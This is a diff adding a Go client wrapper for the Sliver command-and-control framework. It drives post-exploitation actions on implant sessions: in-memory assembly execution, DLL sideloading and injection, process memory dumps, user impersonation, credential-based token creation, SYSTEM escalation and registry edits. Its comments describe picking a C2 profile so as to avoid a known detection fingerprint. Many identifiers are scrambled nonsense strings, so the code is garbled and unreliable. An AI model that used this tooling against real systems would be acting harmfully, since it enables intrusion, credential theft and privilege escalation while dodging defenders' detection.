@@ -1,0 +1,343 @@
+package sliver
+
+import (
+	"context"
+	"encoding/base64"
+	"fmt"
+	"path/filepath"
+	"time"
+
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/cpmfczjv"
+)
+
+// opTimeoutExt — extended operations use a longer timeout for assembly/DLL execution
+const opTimeoutExt = 120 * time.Second
+
+// --- UviysfwQksqwjvi — .NET assembly in-memory execution ---
+type ExecAssemblyResult struct {
+	Output string `json:"output"`
+}
+
+func (c *Client) UviysfwQksqwjvi(sessionID string, assembly []byte, arguments, process string) (*ExecAssemblyResult, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
+	defer cancel()
+	resp, err := c.RPC.UviysfwQksqwjvi(ctx, &cpmfczjv.UviysfwQksqwjviRec{
+		Assembly:  assembly,
+		Arguments: []string{arguments},
+		Process:   process,
+		Request:   &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return nil, err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return nil, fmt.Errorf("%s", resp.Response.Err)
+	}
+	return &ExecAssemblyResult{Output: string(resp.Output)}, nil
+}
+
+// --- Ikjwlast — DLL sideloading ---
+type SideloadResult struct {
+	Result string `json:"result"`
+}
+
+func (c *Client) Ikjwlast(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
+	defer cancel()
+	resp, err := c.RPC.Ikjwlast(ctx, &cpmfczjv.IkjwlastRoc{
+		Data:        data,
+		ProcessName: processName,
+		Args:        []string{args},
+		EntryPoint:  entryPoint,
+		Request:     &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return nil, err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return nil, fmt.Errorf("%s", resp.Response.Err)
+	}
+	return &SideloadResult{Result: resp.Result}, nil
+}
+
+// --- IneenBfl — DLL injection ---
+func (c *Client) IneenBfl(sessionID string, data []byte, processName, args, entryPoint string) (*SideloadResult, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
+	defer cancel()
+	resp, err := c.RPC.IneenBfl(ctx, &cpmfczjv.YnbciuEhswlZdvNkk{
+		Data:        data,
+		ProcessName: processName,
+		Args:        []string{args},
+		EntryPoint:  entryPoint,
+		Request:     &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return nil, err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return nil, fmt.Errorf("%s", resp.Response.Err)
+	}
+	return &SideloadResult{Result: resp.Result}, nil
+}
+
+// --- Migrate — process migration ---
+//
+// Guard: sliver-server's Migrate RPC dereferences req.Config (config.Format = ...)
+// without nil-checking, panicking (and crashing the server) when Config is nil.
+// Always send a non-nil Config. Use ms-update (not public "default") so a nested
+// generate does not stamp the stock HTTP C2 fingerprint. Mirrors migrate.go.
+func (c *Client) Migrate(sessionID string, pid uint32) error {
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	resp, err := c.RPC.Migrate(ctx, &clientpb.MigrateReq{
+		Pid: pid,
+		Config: &clientpb.ImplantConfig{
+			HTTPC2ConfigName: "ms-update",
+		},
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
+
+// --- HlsycykNmgd — dump process memory ---
+type ProcessDumpResult struct {
+	Data string `json:"data"` // base64
+}
+
+func (c *Client) HlsycykNmgd(sessionID string, pid int32) (*ProcessDumpResult, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeoutExt)
+	defer cancel()
+	resp, err := c.RPC.HlsycykNmgd(ctx, &cpmfczjv.HlsycykNmgdLki{
+		Pid:     pid,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return nil, err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return nil, fmt.Errorf("%s", resp.Response.Err)
+	}
+	return &ProcessDumpResult{Data: encodeBase64(resp.Data)}, nil
+}
+
+// --- Yovwrygjszq — impersonate a user ---
+func (c *Client) Yovwrygjszq(sessionID, username string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
+	defer cancel()
+	resp, err := c.RPC.Yovwrygjszq(ctx, &cpmfczjv.YovwrygjszqLki{
+		Username: username,
+		Request:  &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
+
+// --- CcowZacsr — create a token with credentials ---
+func (c *Client) CcowZacsr(sessionID, username, password, domain string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
+	defer cancel()
+	resp, err := c.RPC.CcowZacsr(ctx, &cpmfczjv.CcowZacsrZqs{
+		Username: username,
+		Password: password,
+		Domain:   domain,
+		Request:  &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
+
+// --- JgbBmEwlz — revert impersonation ---
+func (c *Client) JgbBmEwlz(sessionID string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
+	defer cancel()
+	resp, err := c.RPC.JgbBmEwlz(ctx, &cpmfczjv.JgbBmEwlzZqs{
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
+
+// --- WgzCwynso — Windows SYSTEM escalation ---
+//
+// Guard: sliver-server's WgzCwynso RPC dereferences req.Config.HTTPC2ConfigName
+// without nil-checking Config, panicking (and crashing the server) when Config
+// is nil. Always send a non-nil Config. Use ms-update (not public "default") so a
+// nested generate does not stamp the stock HTTP C2 fingerprint. Mirrors getsystem.go.
+func (c *Client) WgzCwynso(sessionID, hostingProcess string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	resp, err := c.RPC.WgzCwynso(ctx, &clientpb.GetSystemReq{
+		HostingProcess: hostingProcess,
+		Config: &clientpb.ImplantConfig{
+			HTTPC2ConfigName: "ms-update",
+		},
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
+
+// --- Ping — check session liveness ---
+type PingResult struct {
+	Nonce int32 `json:"nonce"`
+}
+
+func (c *Client) Ping(sessionID string) (*PingResult, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	resp, err := c.RPC.Ping(ctx, &cpmfczjv.Ping{
+		Nonce:   int32(time.Now().UnixNano() & 0x7FFFFFFF),
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return nil, err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return nil, fmt.Errorf("%s", resp.Response.Err)
+	}
+	return &PingResult{Nonce: resp.Nonce}, nil
+}
+
+// --- DeleteImplantBuild — delete a built implant ---
+func (c *Client) DeleteImplantBuild(name string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	_, err := c.RPC.DeleteImplantBuild(ctx, &clientpb.DeleteReq{Name: name})
+	return err
+}
+
+// --- Regenerate — rebuild an implant without changing config ---
+type RegenerateResult struct {
+	Success       bool   `json:"success"`
+	Message       string `json:"message"`
+	Name          string `json:"name"`
+	Data          string `json:"data"`
+	SHA256        string `json:"sha256,omitempty"`
+	CollisionWith string `json:"collision_with,omitempty"`
+}
+
+func (c *Client) Regenerate(implantName string) (*RegenerateResult, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
+	defer cancel()
+	resp, err := c.RPC.Regenerate(ctx, &clientpb.RegenerateReq{ImplantName: implantName})
+	if err != nil {
+		return nil, err
+	}
+	var raw []byte
+	var data string
+	if resp.File != nil {
+		raw = resp.File.Data
+		data = base64.StdEncoding.EncodeToString(raw)
+	}
+	name := resp.File.Name
+	if name != "" && filepath.Ext(name) == "" {
+		name += implantFileExtension(c.configFromBuild(ctx, implantName))
+	}
+	res := &RegenerateResult{
+		Success: true,
+		Message: fmt.Sprintf("regenerated %s", implantName),
+		Name:    name,
+		Data:    data,
+		SHA256:  sha256Hex(raw),
+	}
+	if other := noteArtifactHash(name, res.SHA256); other != "" {
+		res.CollisionWith = other
+	}
+	return res, nil
+}
+
+// configFromBuild loads the stored implant config for a build so the filename
+// can be completed with the correct platform extension.
+func (c *Client) configFromBuild(ctx context.Context, implantName string) *clientpb.ImplantConfig {
+	builds, err := c.RPC.ImplantBuilds(ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil
+	}
+	return builds.Configs[implantName]
+}
+
+// --- GetOperators — list multiplayer operators ---
+type OperatorView struct {
+	Name   string `json:"name"`
+	Online bool   `json:"online"`
+}
+
+func (c *Client) GetOperators() ([]OperatorView, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+	resp, err := c.RPC.GetOperators(ctx, &commonpb.Empty{})
+	if err != nil {
+		return nil, err
+	}
+	out := make([]OperatorView, 0, len(resp.Operators))
+	for _, op := range resp.Operators {
+		out = append(out, OperatorView{Name: op.Name, Online: op.Online})
+	}
+	return out, nil
+}
+
+// --- JgkiqflyAtqibcOks — create a new registry key ---
+func (c *Client) JgkiqflyAtqibcOks(sessionID, hive, path, key string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
+	defer cancel()
+	resp, err := c.RPC.JgkiqflyAtqibcOks(ctx, &cpmfczjv.JgkiqflyAtqibcOksHya{
+		Hive:    hive,
+		Path:    path,
+		Key:     key,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
+
+// JgkiqflyDojebcOks deletes a registry key or value on a windows session.
+func (c *Client) JgkiqflyDojebcOks(sessionID, hive, path, key string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), opTimeout)
+	defer cancel()
+	resp, err := c.RPC.JgkiqflyDojebcOks(ctx, &cpmfczjv.JgkiqflyDojebcOksHya{
+		Hive:    hive,
+		Path:    path,
+		Key:     key,
+		Request: &commonpb.Request{SessionID: sessionID},
+	})
+	if err != nil {
+		return err
+	}
+	if resp.Response != nil && resp.Response.Err != "" {
+		return fmt.Errorf("%s", resp.Response.Err)
+	}
+	return nil
+}
